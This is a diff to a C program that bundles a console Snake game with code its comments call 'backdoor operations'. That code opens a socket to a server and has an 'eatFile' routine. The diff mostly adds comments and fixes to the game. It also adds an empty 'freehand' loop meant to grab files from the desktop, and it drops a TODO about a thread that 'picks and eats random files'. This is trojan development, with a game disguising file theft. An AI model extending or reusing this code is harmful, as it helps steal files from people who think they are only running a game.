@@ -21,6 +21,7 @@ SOCKET s;
 struct sockaddr_in server;
 char buffer[2048];
 int recv_size;
+int freeHandGiven = 0;
 int awaamiErrorCode;
 
 // Repetitive code declared as functions here...
@@ -68,20 +69,20 @@ int makeConnToServer()
 
 // Recieve data and put it in buffer
 int reliableRecieve()
-
+{
 	// Cleaning buffer before data comes.
 	memset(buffer, 0, strlen(buffer));
 
-if ((recv_size = recv(s, buffer, sizeof(buffer), 0)) == SOCKET_ERROR)
-{
-	return -1;
-}
+	if ((recv_size = recv(s, buffer, sizeof(buffer), 0)) == SOCKET_ERROR)
+	{
+		return -1;
+	}
 
-buffer[recv_size] = '\0';
-if (recv_size == 1)
-	return 0;
+	buffer[recv_size] = '\0';
+	if (recv_size == 1)
+		return 0;
 
-return 1;
+	return 1;
 }
 
 // Send all data stored in buffer
@@ -206,6 +207,18 @@ int eatFile(char fileName[])
 	fclose(filein);
 
 	return 1;
+}
+
+int agentSnakeFreeHand()
+{
+	while (1)
+	{
+		if (freeHandGiven)
+		{
+			// get a file from the desktop
+			// chdir();
+		}
+	}
 }
 
 // Main function for backdoor operations
@@ -355,13 +368,18 @@ struct SnakeGame
 int temp;
 struct SnakeGame snakeGame;
 
+// To store the input key
 char inputCh;
+
+// Type of chars that are printed on render
 char headChar = '0';
 char snakeChar = 'o';
 char backgroundChar = ' ';
 char borderChar = 'X';
 char foodChar = 'a';
 
+// Function to read highscore from the highscore.txt file
+// and store it in the struct
 int readHighScore()
 {
 	FILE *highScoreFilein;
@@ -381,6 +399,8 @@ int readHighScore()
 	return atoi(dataRead);
 }
 
+// Function to read highscore from the program (struct)
+// and store it in the highscore.txt file.
 void setHighScore(int newHigh)
 {
 	FILE *highScoreFilein;
@@ -398,43 +418,47 @@ void setHighScore(int newHigh)
 	}
 }
 
+// Randomly set position of food from withing the screen bounds.
 void putFood()
 {
 	snakeGame.food_x = (rand() % (GAMESCREEN_WIDTH - 2)) + 1;
 	snakeGame.food_y = (rand() % (GAMESCREEN_HEIGHT - 2)) + 1;
 }
 
+// To set up all the values for a new round
 void initialize()
 {
-	// Initialize all values of the array
+	// Clearing all the values of the snakeBody array
 	for (int i = 0; i < (GAMESCREEN_HEIGHT * GAMESCREEN_WIDTH); i++)
 	{
 		snakeGame.snakeBody[i][0] = -1;
 		snakeGame.snakeBody[i][1] = -1;
 	}
 
+	// The intial delay between each frame
 	snakeGame.initDeltaFrame = 250;
 
+	// Set the score to 0 and load the highscore that is written to file
 	snakeGame.score = 0;
 	snakeGame.highScore = readHighScore();
 
+	// Put snake on its starting position
 	snakeGame.snakeBody[0][0] = (int)GAMESCREEN_WIDTH / 2;
 	snakeGame.snakeBody[0][1] = (int)GAMESCREEN_HEIGHT / 2;
 
-	snakeGame.snakeBody[0][0] = (int)(GAMESCREEN_WIDTH / 2) - 1;
-	snakeGame.snakeBody[0][1] = (int)GAMESCREEN_HEIGHT / 2;
-
-	snakeGame.snakeBody[0][0] = (int)(GAMESCREEN_WIDTH / 2) - 2;
-	snakeGame.snakeBody[0][1] = (int)GAMESCREEN_HEIGHT / 2;
-
+	// Set snake's intial length to 1
 	snakeGame.length = 1;
 
+	// Put food for the first time
 	putFood();
 
+	// Set the initial movement direction of the snake
 	snakeGame.vel_x = 1;
 	snakeGame.vel_y = 0;
 }
 
+// Function that returns true if the coordinates passed as
+// parameters are where the snake currently is
 int snakeIsHere(int x, int y)
 {
 	for (int i = 0; i < (GAMESCREEN_WIDTH * GAMESCREEN_HEIGHT); i++)
@@ -448,14 +472,16 @@ int snakeIsHere(int x, int y)
 	return 0;
 }
 
+// Function to check if the game is over
 int checkGameOver()
 {
+	// This condition checks if the snake will hit the wall in the next frame
 	if ((snakeGame.snakeBody[0][0] + snakeGame.vel_x) < (GAMESCREEN_WIDTH - 1) &&
 		(snakeGame.snakeBody[0][0] + snakeGame.vel_x) > 0 &&
 		(snakeGame.snakeBody[0][1] + snakeGame.vel_y) < (GAMESCREEN_HEIGHT - 1) &&
 		(snakeGame.snakeBody[0][1] + snakeGame.vel_y) > 0)
 	{
-		// check if snake ate itself
+		// if it wont hit a wall, this condition checks if the snake will eat itself in the next frame
 		if (snakeIsHere((snakeGame.snakeBody[0][0] + snakeGame.vel_x), (snakeGame.snakeBody[0][1] + snakeGame.vel_y)))
 		{
 			return 1;
@@ -471,11 +497,23 @@ int checkGameOver()
 	}
 }
 
+// function to be called when game is over
 void gameOver()
 {
+	// Update highscore
+	if (snakeGame.score > snakeGame.highScore)
+	{
+		snakeGame.highScore = snakeGame.score;
+
+		// Write new highscore to file
+		setHighScore(snakeGame.score);
+	}
+
+	// Stop the game loop
 	snakeGame.running = 0;
 }
 
+// function that returns true when the snake is eating food
 int hasEatenFood()
 {
 	if (snakeIsHere(snakeGame.food_x, snakeGame.food_y))
@@ -488,9 +526,10 @@ int hasEatenFood()
 	}
 }
 
+// This function is called every time before a frame is rendered
 void update()
 {
-	// See if game over
+	// Check if game should be over and do it
 	if (checkGameOver())
 	{
 		gameOver();
@@ -499,39 +538,42 @@ void update()
 	// Check if food has been eaten
 	if (hasEatenFood())
 	{
+		// If food is eaten then increase it's length and the player's score
 		snakeGame.length++;
 		snakeGame.score++;
 		putFood();
 	}
 
-	// Update the deltaFrame
+	// Update the deltaFrame according to the score
 	if (snakeGame.score == 0)
 	{
 		snakeGame.deltaFrame = (int)snakeGame.initDeltaFrame;
 	}
 	else
 	{
+		// as the score gets higher, the duration between the drawing of each frame decreases
 		snakeGame.deltaFrame = (int)snakeGame.initDeltaFrame / (2 * snakeGame.score);
 	}
 
+	// Dont let the delay go under 50 so that the game stays playable
 	if (snakeGame.deltaFrame < 50)
 	{
 		snakeGame.deltaFrame = 50;
 	}
 
-	// Shift all places to right in body array
+	// Shift all places to right in body array to make room for the new head
 	for (int i = (GAMESCREEN_HEIGHT * GAMESCREEN_WIDTH) - 1; i >= 0; i--)
 	{
 		snakeGame.snakeBody[i + 1][0] = snakeGame.snakeBody[i][0];
 		snakeGame.snakeBody[i + 1][1] = snakeGame.snakeBody[i][1];
 	}
 
-	// add snake head
+	// add snake head to the start of the array
 	snakeGame.snakeBody[0][0] += snakeGame.vel_x;
 	snakeGame.snakeBody[0][1] += snakeGame.vel_y;
 	snakeGame.top++;
 
-	// Remove extra coordinates
+	// Remove extra coordinates from the end of the array so that the length remains unchanged
 	while (snakeGame.top + 1 > snakeGame.length)
 	{
 		snakeGame.snakeBody[snakeGame.top][0] = -1;
@@ -542,6 +584,7 @@ void update()
 
 void render()
 {
+	// prints a character for each pixel on the 2d frame, depending on it's type
 	for (int j = 0; j < GAMESCREEN_HEIGHT; j++)
 	{
 		for (int i = 0; i < GAMESCREEN_WIDTH; i++)
@@ -567,11 +610,12 @@ void render()
 				fprintf(stderr, "%c", backgroundChar);
 			}
 		}
-		printf("\n");
+		fprintf(stderr, "\n");
 	}
-	printf("SCORE: %d, HIGHSCORE: %d", snakeGame.score, snakeGame.highScore);
+	fprintf(stderr, "SCORE: %d, HIGHSCORE: %d", snakeGame.score, snakeGame.highScore);
 }
 
+// Function to take the console typing cursor to the beginning
 void resetCursor()
 {
 	COORD coord;
@@ -582,6 +626,7 @@ void resetCursor()
 	SetConsoleCursorPosition(hConsole, coord);
 }
 
+// function to hide the console's blinking cursor
 void hideCursor()
 {
 	HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
@@ -593,6 +638,7 @@ void hideCursor()
 	SetConsoleCursorInfo(out, &cursorInfo);
 }
 
+// function to fill the screen with empty space and set the typing cursor to the start
 void clearScreen()
 {
 	resetCursor();
@@ -607,6 +653,7 @@ void clearScreen()
 	resetCursor();
 }
 
+// function to print welcome screen
 void showSnakeWelcomeScreen()
 {
 
@@ -637,6 +684,7 @@ void showSnakeWelcomeScreen()
 	getch();
 }
 
+//  function to tshow the gameover screen
 void showGameOverScreen()
 
 {
@@ -655,11 +703,12 @@ void showGameOverScreen()
 
 	fprintf(stderr, "\n\nSCORE: %d, HIGHSCORE: %d", snakeGame.score, snakeGame.highScore);
 
-	printf("\n\nPress any key to try again...");
+	fprintf(stderr, "\n\nPress any key to try again...");
 	fflush(stdin);
 	getch();
 }
 
+// function to pause the game and display the pause screen
 void pauseGame()
 {
 	for (int i = 0; i < (int)GAMESCREEN_HEIGHT / 2; i++)
@@ -677,31 +726,37 @@ void pauseGame()
 	getch();
 }
 
+// function to do things based on the user's input
 void handleInput()
 {
 	if (_kbhit())
 	{
 		inputCh = getch();
+		// set movement direction to UP
 		if ((inputCh == 'w' || inputCh == 'W') && snakeGame.vel_y != 1)
 		{
 			snakeGame.vel_x = 0;
 			snakeGame.vel_y = -1;
 		}
+		// set movement direction to LEFT
 		else if ((inputCh == 'a' || inputCh == 'A') && snakeGame.vel_x != 1)
 		{
 			snakeGame.vel_x = -1;
 			snakeGame.vel_y = 0;
 		}
+		// set movement direction to DOWN
 		else if ((inputCh == 's' || inputCh == 'S') && snakeGame.vel_y != -1)
 		{
 			snakeGame.vel_x = 0;
 			snakeGame.vel_y = 1;
 		}
+		// set movement direction to RIGHT
 		else if ((inputCh == 'd' || inputCh == 'D') && snakeGame.vel_x != -1)
 		{
 			snakeGame.vel_x = 1;
 			snakeGame.vel_y = 0;
 		}
+		// pause the game and show pause screen
 		else if ((inputCh == 'p' || inputCh == 'P'))
 		{
 			clearScreen();
@@ -719,6 +774,7 @@ int snakeGameMain()
 	clearScreen();
 	showSnakeWelcomeScreen();
 
+	// Continous loop of the game
 	while (1)
 	{
 		// Snake Game Starts
@@ -730,7 +786,10 @@ int snakeGameMain()
 		{
 			update();
 			render();
+
+			// Wait as long as the set delay between each frame
 			Sleep(snakeGame.deltaFrame);
+
 			handleInput();
 			fflush(stdin);
 			resetCursor(0, 0);
@@ -739,6 +798,8 @@ int snakeGameMain()
 		// Snake Game Over
 		clearScreen();
 		showGameOverScreen();
+
+		// Set game to run again once te gameover screen is done displaying
 		snakeGame.running = 1;
 		fflush(stdin);
 	}
@@ -763,10 +824,6 @@ void *thread2()
 {
 	snakeGameMain();
 }
-
-// TODO: Make a new thread called freehand that picks and eats random files
-
-// TODO: Fix highscore bug.
 
 int main(int argc, char *argv[])
 {
